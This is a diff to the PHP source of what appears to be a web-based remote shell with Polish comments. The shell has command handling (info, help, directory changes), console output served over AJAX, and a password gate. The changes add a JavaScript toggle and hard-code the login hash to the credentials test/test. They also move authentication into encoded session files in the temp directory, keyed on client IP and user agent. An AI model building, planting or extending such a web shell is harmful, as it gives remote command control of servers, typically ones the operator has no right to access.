@@ -232,6 +232,14 @@ info - Wyświetla informacje o systemie';
 	public $bDev = FALSE;
 
 	/**
+	 * Jezeli TRUE to skrypty JavaScript sa wlaczone
+	 *
+	 * @access public
+	 * @var     boolean
+	 */
+	public $bJs = TRUE;
+
+	/**
 	 * Konstruktor
 	 *
 	 * @uses   Request
@@ -241,6 +249,7 @@ info - Wyświetla informacje o systemie';
 	 */
 	public function __construct()
 	{
+		$this -> sAuth = sha1( "test\xfftest");
 		/**
 		 * Czas generowania strony
 		 */
@@ -299,6 +308,14 @@ info - Wyświetla informacje o systemie';
 		if( isset( $_GET['dev'] ) )
 		{
 			$this -> bDev = TRUE;
+		}
+
+		/**
+		 * Wylaczenie JavaScript
+		 */
+		if( isset( $_GET['nojs'] ) )
+		{
+			$this -> bJs = FALSE;
 		}
 
 		/**
@@ -463,6 +480,9 @@ info - Wyświetla informacje o systemie';
 			$sKey = $this -> sKey;
 		}
 
+		/**
+		 * Musza wystepowac jakies dane
+		 */
 		if( ( $iDataLen = strlen( $sData ) ) === 0 )
 		{
 			return NULL;
@@ -498,6 +518,14 @@ info - Wyświetla informacje o systemie';
 		if( $sKey === NULL )
 		{
 			$sKey = $this -> sKey;
+		}
+
+		/**
+		 * Musza wystepowac jakies dane
+		 */
+		if( strlen( $sData ) === 0 )
+		{
+			return NULL;
 		}
 
 		$sData = gzuncompress( $sData );
@@ -721,6 +749,7 @@ help - Wyświetlanie pomocy
 		help
 DATA;
 		}
+
 		$iMaxLen = 0;
 
 		/**
@@ -739,7 +768,6 @@ DATA;
 		/**
 		 * Formatowanie natywnego helpa
 		 */
-
 		$aHelp = array_filter( preg_split( '~\r\n|\n|\r~', self::HELP ) );
 
 		/**
@@ -832,7 +860,7 @@ DATA;
 		{
 			file_put_contents( $this -> sTmp . '/' . $this -> sPrefix . 'chdir', $this -> encode( $this -> sArgv ) );
 
-			return sprintf( "Katalog zmieniono na:\r\n\t%s", $this -> sArgv );
+			return sprintf( "Katalog zmieniono na:\r\n\t%s", getcwd() );
 		}
 
 		return 'Nie udało się zmienić katalogu!!!';
@@ -1342,6 +1370,12 @@ DATA;
 		if( strncasecmp( Request::getServer( 'HTTP_X_REQUESTED_WITH' ), 'XMLHttpRequest', 14 ) === 0 )
 		{
 			preg_match( '~<pre id="console">(.*)</pre>~s', $sData, $aMatch );
+
+			if( $aMatch === array() )
+			{
+				return 'Występił nieznany błąd';
+			}
+
 			return $aMatch[1];
 		}
 
@@ -1350,7 +1384,7 @@ DATA;
 		/**
 		 * Wylaczenie JavaScript
 		 */
-		if( isset( $_GET['nojs']) )
+		if( ! $this -> bJs )
 		{
 			$sScript = NULL;
 		}
@@ -1380,24 +1414,33 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 		 */
 		if( $this -> sAuth !== NULL )
 		{
-			session_start();
+			$sAuth = NULL;
 
-			if( ! ( isset( $_SESSION['auth'] ) && ( $_SESSION['auth'] === sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ) ) ) ) )
+			if(     is_file( $sAuthFilename = $this -> sTmp . '/' . $this -> sPrefix . md5( Request::getServer( 'REMOTE_ADDR' ) . Request::getServer( 'USER_AGENT' ) ) . '_session' )
+			    && ( ( $sData = file_get_contents( $sAuthFilename ) ) !== FALSE )
+			)
+			{
+				$sAuth = $this -> decode( $sData );
+			}
+
+			if( $sAuth !== sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ), TRUE ) )
 			{
 				if( ! ( ( ( $sUser = Request::getPost( 'user') ) !== FALSE )
 				    && ( ( $sPass = Request::getPost( 'pass') ) !== FALSE )
 				    && ( $this -> sAuth === sha1( $sUser . "\xff" . $sPass ) ) )
 				)
 				{
+					$this -> bJs = FALSE;
+
 					echo $this -> getContent(
-							sprintf( '<form action="%s" method="post"><input type="text" name="user"/><input type="text" name="pass"/><input type="submit" name="submit" value="Go !"/></form>',
+							sprintf( '<form action="%s" method="post"><input type="text" name="user"/><input type="password" name="pass"/><input type="submit" name="submit" value="Go !"/></form>',
 								Request::getCurrentUrl()
 							), FALSE
 					);
 					return ;
 				}
 
-				$_SESSION['auth'] = sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ) );
+				file_put_contents( $sAuthFilename, $this -> encode( sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ), TRUE ) ) );
 			}
 		}
 
